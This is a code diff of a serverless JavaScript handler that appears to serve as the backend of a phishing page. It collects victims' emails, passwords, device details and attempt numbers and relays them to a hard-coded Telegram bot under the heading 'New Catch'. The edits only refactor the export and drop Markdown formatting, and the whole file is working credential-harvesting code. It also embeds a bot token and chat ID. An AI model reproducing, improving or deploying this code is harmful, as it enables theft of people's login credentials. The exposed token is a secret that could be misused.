@@ -1,8 +1,8 @@
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
     const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
     const CHAT_ID = '7607355489';
 
-    // CORS headers just in case
+    // CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -17,13 +17,13 @@ export default async function handler(req, res) {
 
     const data = req.body;
 
-    const text = `*🎣 New Catch*\n\n` +
-                 `*Email:* \\${data.email}\n` +
-                 `*Pass:* \\${data.password}\n` +
-                 `*Attempt:* #${data.attemptNumber}\n` +
-                 `*Time:* ${new Date(data.timestamp).toLocaleString()}\n` +
-                 `*Device:* ${data.userAgent}\n` +
-                 `*Screen:* ${data.screen}`;
+    const text = `🎣 New Catch\n\n` +
+                 `Email: ${data.email}\n` +
+                 `Pass: ${data.password}\n` +
+                 `Attempt: #${data.attemptNumber}\n` +
+                 `Time: ${new Date(data.timestamp).toLocaleString()}\n` +
+                 `Device: ${data.userAgent}\n` +
+                 `Screen: ${data.screen}`;
 
     try {
         const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -31,8 +31,7 @@ export default async function handler(req, res) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
+                text: text
             })
         });
 
@@ -44,4 +43,4 @@ export default async function handler(req, res) {
         console.error('Telegram error:', err.message);
         return res.status(200).json({ ok: false, error: err.message });
     }
-}
+};
